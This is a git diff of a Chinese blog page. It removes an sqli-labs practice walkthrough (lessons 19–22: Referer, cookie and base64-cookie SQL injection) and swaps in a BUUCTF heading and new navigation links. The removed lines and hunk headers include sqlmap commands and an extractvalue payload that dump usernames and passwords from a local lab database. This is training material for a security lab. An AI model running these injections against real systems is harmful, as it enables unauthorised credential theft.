-<pre class="line-numbers language-none"><code class="language-none">❯ python sqlmap.py -r 抓包保存的文件路径 --tech E --dbms mysql -D security -T users --threads 5 --level=4 --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h2 id="less19"><a href="#less19" class="headerlink" title="less19"></a>less19</h2><p><strong>手动</strong></p>
-<p>输入正确会显示Referer,错误没有显示,这题基本上就是Referer这里存在注入</p>
-<p>和18题一样,只是注入点不一样,用上一题的payload就行了</p>
-<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208200709726.png" alt="image-20210208200709726"></p>
-<p><strong>sqlmap</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">❯ python sqlmap.py -r 抓包保存的文件路径 --tech E --dbms mysql -D security -T users --threads 5 --level=4 --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h2 id="less20"><a href="#less20" class="headerlink" title="less20"></a>less20</h2><p><strong>手动</strong></p>
-<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208200722575.png" alt="image-20210208200722575"></p>
-<p>基本上就是cookie注入了</p>
-<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208200801021.png" alt="image-20210208200801021"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208200817248.png" alt="image-20210208200817248"></p>
-<p><strong>sqlmap</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">❯ python sqlmap.py -u "http://127.0.0.1/sqli-labs/Less-20/" --cookie="uname=admin*"--dbms=MySQL --random-agent --flush-session --technique=B -v 3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h2 id="less21"><a href="#less21" class="headerlink" title="less21"></a>less21</h2><p><strong>手动</strong></p>
-<p>这题和上一题一样,就是把payload用base64编码了</p>
-<p>把上一题的payload base64编码一下就是这题的payload了</p>
-<p><strong>sqlmap</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">sqlmap.py -r 抓包保存的文件路径 --cookie uname=YWRtaW4%3D --tech E --dbms mysql --tamper base64encode.py --batch -v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h2 id="less22"><a href="#less22" class="headerlink" title="less22"></a>less22</h2><p><strong>手动</strong></p>
-<p>和上一题的一样,就是把闭合方式改成了双引号</p>
-<p><strong>sqlmap</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">sqlmap.py -r 抓包保存的文件路径 --cookie uname=YWRtaW4= --tech E --dbms mysql --tamper base64encode.py --batch -v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2>
                 
             </div>
             <hr/>
@@ -645,7 +465,7 @@ username=1') and extractvalue(1,concat(1,(select concat(username,0x3a,password) 
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://anwar211.top/2020/ba-chang-xue-xi/sqli-labs/">https://anwar211.top/2020/ba-chang-xue-xi/sqli-labs/</a>
+                    <a href="https://anwar211.top/2021/web/buuctf/">https://anwar211.top/2021/web/buuctf/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -731,12 +551,12 @@ username=1') and extractvalue(1,concat(1,(select concat(username,0x3a,password) 
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2020/ba-chang-xue-xi/upload-labs/">
+                <a href="/2021/linux/archlinux/">
                     <div class="card-image">
                         
-                        <img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208205421280.png" class="responsive-img" alt="upload-labs">
+                        <img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208205844005.png" class="responsive-img" alt="Archlinux">
                         
-                        <span class="card-title">upload-labs</span>
+                        <span class="card-title">Archlinux</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -747,14 +567,14 @@ username=1') and extractvalue(1,concat(1,(select concat(username,0x3a,password) 
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-11-30
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-02-06
                         </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/CTF/" class="post-category">
-                                    CTF
+                            <a href="/categories/Linux/" class="post-category">
+                                    Linux
                                 </a>
                             
                             
@@ -764,8 +584,8 @@ username=1') and extractvalue(1,concat(1,(select concat(username,0x3a,password) 
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/web/">
-                        <span class="chip bg-color">web</span>
+                    <a href="/tags/linux/">
+                        <span class="chip bg-color">linux</span>
                     </a>
                     
                 </div>
@@ -779,12 +599,13 @@ username=1') and extractvalue(1,concat(1,(select concat(username,0x3a,password) 
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/chang-jian-lou-dong/sql-zhu-ru/">
+                <a href="/2021/web/codeaudit/">
                     <div class="card-image">
                         
-                        <img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208205152774.png" class="responsive-img" alt="sql注入原理及sqlmap的使用">
                         
-                        <span class="card-title">sql注入原理及sqlmap的使用</span>
+                        <img src="https://cdn.jsdelivr.net/gh/anwar211/anwar211.github.io@main/medias/featureimages/4.jpg" class="responsive-img" alt="Code Audit">
+                        
+                        <span class="card-title">Code Audit</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -795,7 +616,7 @@ username=1') and extractvalue(1,concat(1,(select concat(username,0x3a,password) 
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-11-27
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-02-03
                             </span>
                         <span class="publish-author">
                             
